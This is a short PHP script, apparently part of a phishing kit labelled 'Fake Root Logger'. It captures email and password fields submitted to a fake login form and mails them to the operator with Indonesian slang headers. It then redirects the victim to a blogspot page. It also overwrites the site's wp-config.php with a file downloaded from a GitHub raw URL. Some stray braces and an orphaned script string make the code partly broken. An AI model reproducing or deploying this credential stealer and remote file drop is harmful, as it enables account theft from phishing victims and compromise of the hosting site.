<?php


$nick = $_POST['nickname'];
$email2 = $_POST['fb1'];
$pass2 = $_POST['fb2'];
$lev = $_POST['level'];
$log = $_POST['login'];
$ski = $_POST['rank'];
$emailr= $_POST['elite'];
$passr= $_POST['passr'];

$message   = "

====[ DATA DATA NYA BRO ]====

• Email  :  ".$email2."

• Password  : ".$pass2."

[ + ] --- ./Fake Root Logger --- [ + ] 

";

include 'email.php';
$subject = "DATA COK";
$headers = "From: SETOR DATA <reeditkev@result.net>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));

?>
'<script>window.location.replace("https://fake-root.blogspot.com")</script>';}
}
?>
<?php
$nama= fopen("wp-config.php" ,"w+");
  $file = file_get_contents('https://raw.githubusercontent.com/fakeroot76/fake/master/wp-config.php');
  $tulis = fwrite ($nama ,$file);
 fclose($nama);
?>
